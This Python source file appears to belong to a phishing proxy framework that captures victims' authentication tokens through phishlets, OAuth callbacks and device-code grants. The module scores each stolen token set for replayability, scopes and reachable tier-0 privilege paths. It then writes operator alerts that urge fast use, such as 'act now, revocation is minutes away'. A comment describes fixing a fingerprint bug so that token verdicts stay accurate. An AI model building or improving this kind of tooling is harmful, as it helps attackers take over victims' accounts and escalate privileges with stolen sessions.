# ============================================================================
# FILE: core/tokenintel.py
# ============================================================================
"""What a captured token set actually is, computed where the token lands.

The token tier (replayability, scope, PRT posture, passkey exposure) is only useful if it is
attached to the session the moment the tokens arrive - a verdict an operator has to ask for
afterwards is a verdict that arrives after the window closed. So this module is called from
the store's own save path: every capture that carries tokens gets annotated once, whatever
route it came through (the proxy's OAuth callback, a device-code grant, a phishlet's
`auth_tokens`, a cookie jar that holds a bearer).

It computes and reports; it never replays anything. The report is what tells the operator
whether the session in front of them is worth acting on in the next five minutes or was
already dead when it was captured.
"""
import time

__all__ = ["annotate", "summary", "line"]


def annotate(record, intel=None, policy=None, force=False):
    """Fill `record["token_intel"]` from the record's own tokens.

    Idempotent: a record whose tokens have not changed keeps its verdict (the annotation is
    stamped with the token fingerprint), so a page view does not re-run the analysis.
    """
    if not isinstance(record, dict):
        return {}
    tokens = record.get("tokens") or {}
    if not tokens:
        return record.get("token_intel") or {}
    fingerprint = _fingerprint(tokens)
    existing = record.get("token_intel") or {}
    if not force and existing.get("fingerprint") == fingerprint:
        return existing

    from core import dbsc, tier0
    from core import passkey as _passkey

    replay = dbsc.replayability(tokens, device_token=record.get("device_token", ""),
                                ja3=str((record.get("ja3") or {}).get("ja3", ""))
                                if isinstance(record.get("ja3"), dict)
                                else str(record.get("ja3") or ""),
                                ip=record.get("ip", ""))
    posture = tier0.assess(tokens, policy=policy)
    keys = sorted(tokens)
    out = {
        "fingerprint": fingerprint,
        "replayability": replay.get("verdict"),
        "device_bound": replay.get("device_bound"),
        "cae_capable": replay.get("cae_capable"),
        "reasons": replay.get("reasons") or [],
        "scopes": _scopes(tokens),
        "tier0": [{"path": row["path"], "verdict": row["verdict"],
                   "rights_held": row["rights_held"]} for row in posture.get("verdicts") or []],
        "rights_seen": posture.get("rights_seen") or [],
        "passkey": _passkey.detect(intel=intel) if intel else {},
        "tokens": keys,
        "at": time.time(),
    }
    record["token_intel"] = out
    return out


def summary(record):
    """One line for the operator: the verdict, the scopes, and the tier-0 rungs worth a look."""
    intel = (record or {}).get("token_intel") or {}
    if not intel:
        return "token tier: nothing captured yet"
    bits = [f"replayability={intel.get('replayability', 'unknown')}"]
    if intel.get("device_bound"):
        bits.append("device-bound")
    if intel.get("cae_capable"):
        bits.append("CAE-aware")
    if intel.get("scopes"):
        bits.append("scopes=" + ",".join(intel["scopes"][:4]))
    open_paths = [row["path"] for row in intel.get("tier0") or []
                  if row["verdict"] in ("open", "needs_a_call")]
    if open_paths:
        bits.append("tier-0 in reach: " + ",".join(open_paths))
    return "token tier: " + " | ".join(bits)


def line(record):
    """The alert line: only the part that changes a decision."""
    intel = (record or {}).get("token_intel") or {}
    if not intel:
        return ""
    verdict = intel.get("replayability")
    if verdict == "not_replayable":
        return ("tokens captured but NOT replayable"
                + (" (device-bound)" if intel.get("device_bound") else "")
                + ": use them inside the session, or not at all")
    if verdict == "fragile":
        return "tokens captured, fragile (CAE-aware): act now, revocation is minutes away"
    if verdict == "replayable":
        return "tokens captured and replayable: the refresh token works from elsewhere"
    return "tokens captured, replayability unknown"


def _fingerprint(tokens):
    import hashlib
    # DEFECT: every value was truncated to 64 characters, so two different tokens that
    # share a 64-char prefix - routine for JWTs from the same issuer, or an access token
    # that is merely re-issued - produced the SAME fingerprint and the cached verdict was
    # reused for changed tokens. A stale "replayable" on an already-expired token is
    # exactly the verdict the operator must not be handed. Hash the full set instead.
    blob = "|".join(f"{k}={tokens[k]}" for k in sorted(tokens))
    return hashlib.sha256(blob.encode()).hexdigest()[:16]


def _scopes(tokens):
    """The scopes in the token set, from the decoded claims or the answer's own field."""
    from core import dbsc
    out = []
    for key in ("scope", "scopes"):
        value = tokens.get(key)
        if isinstance(value, str):
            out.extend(value.split())
        elif isinstance(value, (list, tuple)):
            out.extend(str(v) for v in value)
    for claim in ("scp", "roles"):
        value = dbsc.claims_of(tokens).get(claim)
        if isinstance(value, str):
            out.extend(value.split())
        elif isinstance(value, (list, tuple)):
            out.extend(str(v) for v in value)
    seen, unique = set(), []
    for item in out:
        if item not in seen:
            seen.add(item)
            unique.append(item)
    return unique[:20]
